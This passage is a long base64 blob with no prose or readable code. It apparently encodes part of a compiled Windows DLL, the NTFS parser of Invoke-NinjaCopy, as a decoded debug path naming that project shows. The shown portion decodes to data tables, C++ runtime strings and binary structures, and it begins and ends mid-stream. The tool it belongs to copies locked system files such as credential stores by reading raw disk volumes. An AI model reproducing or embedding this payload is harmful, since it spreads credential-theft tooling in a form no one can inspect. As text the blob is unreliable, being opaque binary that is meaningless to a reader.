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b25zdHJ1Y3RvciBjbG9zdXJlJwAAAGBzY2FsYXIgZGVsZXRpbmcgZGVzdHJ1Y3RvcicAAAAAYHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGB2ZWN0b3IgdmJhc2UgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAABgdmlydHVhbCBkaXNwbGFjZW1lbnQgbWFwJwAAAAAAAGBlaCB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAAAAAABgZWggdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAGBlaCB2ZWN0b3IgdmJhc2UgY29uc3RydWN0b3IgaXRlcmF0b3InAABgY29weSBjb25zdHJ1Y3RvciBjbG9zdXJlJwAAAAAAAGB1ZHQgcmV0dXJuaW5nJwBgRUgAYFJUVEkAAAAAAAAAYGxvY2FsIHZmdGFibGUnAGBsb2NhbCB2ZnRhYmxlIGNvbnN0cnVjdG9yIGNsb3N1cmUnACBuZXdbXQAAAAAAACBkZWxldGVbXQAAAAAAAABgb21uaSBjYWxsc2lnJwAAYHBsYWNlbWVudCBkZWxldGUgY2xvc3VyZScAAAAAAABgcGxhY2VtZW50IGRlbGV0ZVtdIGNsb3N1cmUnAAAAAGBtYW5hZ2VkIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgbWFuYWdlZCB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAAAAAYGVoIHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBlaCB2ZWN0b3IgdmJhc2UgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAGBkeW5hbWljIGluaXRpYWxpemVyIGZvciAnAAAAAAAAYGR5bmFtaWMgYXRleGl0IGRlc3RydWN0b3IgZm9yICcAAAAAAAAAAGB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAABgdmVjdG9yIHZiYXNlIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAAAAAABgbWFuYWdlZCB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAA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AAAAAAAAAAAAAFDAAQDAigEAmIoBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAADYigEAAAAAAAAAAADwigEAyIkBAAAAAAAAAAAAAAAAAAAAAABQwAEAAQAAAAAAAAD/////AAAAAEAAAADAigEAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAeMABAECLAQAYiwEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAFiLAQAAAAAAAAAAAHiLAQDwigEAyIkBAAAAAAAAAAAAAAAAAAAAAAAAAAAAeMABAAIAAAAAAAAA/////wAAAABAAAAAQIsBAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAKDAAQDIiwEAoIsBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAADgiwEAAAAAAAAAAAAAjAEA8IoBAMiJAQAAAAAAAAAAAAAAAAAAAAAAAAAAAKDAAQACAAAAAAAAAP////8AAAAAQAAAAMiLAQAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAADQwAEAUIwBACiMAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAaIwBAAAAAAAAAAAAeIwBAAAAAAAAAAAAAAAAANDAAQAAAAAAAAAAAP////8AAAAAQAAAAFCMAQAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAowAEA8IkBAKCMAQAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAaMwBAPCMAQDIjAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAiNAQAAAAAAAAAAACCNAQDIiQEAAAAAAAAAAAAAAAAAAAAAAGjMAQABAAAAAAAAAP////8AAAAAQAAAAPCMAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAACIjgEAAAAAAAAAAAAY1AEAAAAAAAAAAAD/////AAAAAEAAAABIjQEAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAoI0BAAAAAAAAAAAAmI4BAOiNAQBgjQEAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAABI1AEAGI8BAMCNAQAAAAAAAAAAAAAAAAAAAAAASNQBAAEAAAAAAAAA/////wAAAABAAAAAGI8BAAAAAAAAAAAAAAAAAKjTAQACAAAAAAAAAP////8AAAAAQAAAAMCOAQAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAY1AEASI0BADiOAQAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAqNMBAMCOAQBgjgEAAAAAAAAAAAAAAAAAAAAAAGCNAQAAAAAAAAAAAAAAAADg0wEAAgAAAAAAAAD/////AAAAAEAAAACIjQEAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAMI8BAAAAAAAAAAAAAQAAAAAAAAAAAAAA4NMBAIiNAQDYjgEAAAAAAAAAAAAAAAAAAAAAAOiNAQBgjQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAACPAQAAAAAAAAAAABCOAQDojQEAYI0BAAAAAAAAAAAAAAAAAAAAAAAAAAAAwJEBAGiUAQColQEAAAAAAAAAAAAAAAAAAAAAAAAAAADokQEAQJQBAKiVAQAAAAAAAAAAAAAAAAAAAAAAAAAAABCSAQBolAEAqJUBAAAAAAAAAAAAAAAAAAAAAAAAAAAAOJIBAECUAQColQEAAAAAAAAAAAAAAAAAAAAAAAAAAABgkgEAaJQBAKiVAQAAAAAAAAAAAAAAAAAAAAAAAAAAAIiSAQBAlAEAqJUBAAAAAAAAAAAAAAAAAAAAAAAAAAAAsJIBAAAAAAAAAAAAAAAAANiSAQBAlAEAqJUBAAAAAAAAAAAAAAAAAAAAAAAAAAAAKJMBAGiUAQColQEAAJMBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFCTAQCQlAEAAAAAAAAAAAAAAAAAAAAAAHiTAQBolAEAqJUBAAAAAAAAAAAAAAAAAAAAAAAAAAAAoJMBAGiUAQColQEAAAAAAAAAAAAAAAAAAAAAAAAAAADwkwEAaJQBAKiVAQDIkwEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGJQBAGiUAQColQEAAAAAAAAAAAAAAAAAAAAAAAAAAABAlAEAqJUBAAAAAAAAAAAAAAAAAAAAAABolAEAqJUBAAAAAAAAAAAAAAAAAAAAAACQlAEAAAAAAAAAAAAAAAAAuJQBAAAAAAAAAAAAAAAAAOCUAQAAAAAAAAAAAAAAAAAIlQEAAAAAAAAAAAAAAAAAMJUBAAAAAAAAAAAAAAAAAFiVAQCAlQEAAAAAAAAAAAAAAAAAAAAAAICVAQAAAAAAAAAAAAAAAAColQEAAAAAAAAAAAAAAAAAgNQBAAIAAAAAAAAA/////wAAAABAAAAA0JUBAAAAAAAAAAAAAAAAALjUAQACAAAAAAAAAP////8AAAAAQAAAAOiVAQAAAAAAAAAAAAAAAAD41AEAAgAAAAAAAAD/////AAAAAEAAAAAAlgEAAAAAAAAAAAAAAAAAMNUBAAIAAAAAAAAA/////wAAAABAAAAAGJYBAAAAAAAAAAAAAAAAAGjVAQACAAAAAAAAAP////8AAAAAQAAAADCWAQAAAAAAAAAAAAAAAACg1QEAAgAAAAAAAAD/////AAAAAEAAAABIlgEAAAAAAAAAAAAAAAAA4NUBAAAAAAAAAAAA/////wAAAABAAAAAYJYBAAAAAAAAAAAAAAAAABDWAQACAAAAAAAAAP////8AAAAAQAAAAHiWAQAAAAAAAAAAAAAAAAB41wEAAAAAAEgAAAD/////AAAAAEAAAABQlwEAAAAAAAAAAAAAAAAAONYBAAMAAAAAAAAA/////wAAAABAAAAAkJYBAAAAAAAAAAAAAAAAAGDWAQABAAAAAAAAAP////8AAAAAQAAAAKiWAQAAAAAAAAAAAAAAAACI1gEAAgAAAAAAAAD/////AAAAAEAAAADAlgEAAAAAAAAAAAAAAAAAsNYBAAIAAAAAAAAA/////wAAAABAAAAA2JYBAAAAAAAAAAAAAAAAAGDYAQAAAAAASAAAAP////8AAAAAQAAAAMiXAQAAAAAAAAAAAAAAAADY1gEAAwAAAAAAAAD/////AAAAAEAAAADwlgEAAAAAAAAAAAAAAAAAANcBAAIAAAAAAAAA/////wAAAABAAAAACJcBAAAAAAAAAAAAAAAAACjXAQABAAAAAAAAAP////8AAAAAQAAAACCXAQAAAAAAAAAAAAAAAABQ1wEAAQAAAAAAAAD/////AAAAAEAAAAA4lwEAAAAAAAAAAAAAAAAAeNcBAAAAAAAAAAAA/////wAAAABAAAAAUJcBAAAAAAAAAAAAAAAAAKjXAQAAAAAAAAAAAP////8AAAAAQAAAAGiXAQAAAAAAAAAAAAAAAADg1wEAAAAAAAAAAAD/////AAAAAEAAAACAlwEAAAAAAAAAAAAAAAAAENgBAAAAAAAAAAAA/////wAAAABAAAAAmJcBAAAAAAAAAAAAAAAAADjYAQAAAAAAAAAAAP////8AAAAAQAAAALCXAQAAAAAAAAAAAAAAAACA2AEAAQAAAAAAAAD/////AAAAAEAAAADglwEAAAAAAAAAAAAAAAAAYNgBAAAAAAAAAAAA/////wAAAABAAAAAyJcBAAAAAAAAAAAAAAAAAKjYAQAAAAAAAAAAAP////8AAAAAQAAAAPiXAQAAA